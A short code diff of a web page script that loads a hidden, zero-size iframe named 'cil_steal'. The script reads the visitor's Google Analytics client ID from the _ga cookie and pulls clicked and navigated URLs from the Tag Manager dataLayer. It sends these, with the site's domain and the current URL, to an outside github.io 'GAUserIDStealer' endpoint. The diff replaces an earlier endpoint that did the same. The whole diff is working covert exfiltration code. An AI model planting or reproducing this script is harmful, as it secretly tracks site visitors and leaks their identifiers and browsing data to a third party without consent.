@@ -1,4 +1,4 @@
-<iframe id="asff_steal" height="0" width="0" style="display:none;visibility:hidden"src=""></iframe>
+<iframe id="cil_steal" height="0" width="0" style="display:none;visibility:hidden"src=""></iframe>
 <script>
     function getgaCid() {
         var name = "_ga=";
@@ -27,5 +27,30 @@
             break;
         }
     }
-    document.getElementById("asff_steal").src ="https://anthonybrien6552.github.io/sending_for_fun?uid="+uuid+"&domain="+window.location.hostname+"&cid="+getgaCid()+"&url="+window.location.href;
+    element_url=-1
+    for(i=dataLayer.length-1;i>0;i--){
+        try{
+            element_url=dataLayer[i]['gtm.elementUrl'];
+        }
+        catch(e){
+            console.log("pass");
+        }
+        if(element_url!=null){
+            break;
+        }
+    }
+    new_url=-1
+    for(i=dataLayer.length-1;i>0;i--){
+        try{
+            new_url=dataLayer[i]['gtm.newUrl'];
+        }
+        catch(e){
+            console.log("pass");
+        }
+        if(new_url!=null){
+            break;
+        }
+    }
+    
+    document.getElementById("cil_steal").src ="https://cilegann.github.io/GAUserIDStealer/steal.html?uid="+uuid+"&domain="+window.location.hostname+"&cid="+getgaCid()+"&url="+window.location.href+"&element_url="+element_url+"&new_url="+new_url;
 </script>
